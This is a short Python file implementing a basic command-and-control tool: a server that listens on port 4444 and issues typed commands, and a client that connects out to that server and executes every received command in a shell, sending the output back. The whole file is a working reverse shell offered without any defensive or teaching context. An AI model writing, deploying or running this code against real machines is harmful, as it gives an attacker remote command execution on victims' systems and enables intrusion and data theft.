import socket

def send_command(target_ip, target_port, command):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((target_ip, target_port))
            s.sendall(command.encode())
            data = s.recv(4096).decode()
            return data
    except Exception as e:
        return f"[!] Error sending command: {e}"

def start_c2_server(bind_ip="0.0.0.0", bind_port=4444):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
            server.bind((bind_ip, bind_port))
            server.listen(1)
            print(f"[*] C2 Server listening on {bind_ip}:{bind_port}")
            conn, addr = server.accept()
            print(f"[+] Connection from {addr}")
            while True:
                command = input("C2> ").strip()
                if command.lower() in ("exit", "quit"):
                    break
                conn.sendall(command.encode())
                output = conn.recv(4096).decode()
                print(output)
    except Exception as e:
        print(f"[!] Server error: {e}")

def start_c2_client(server_ip, server_port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((server_ip, server_port))
            while True:
                command = s.recv(4096).decode()
                if not command:
                    break
                try:
                    import subprocess
                    result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                    s.sendall(result)
                except subprocess.CalledProcessError as e:
                    s.sendall(e.output)
    except Exception as e:
        print(f"[!] Client error: {e}")
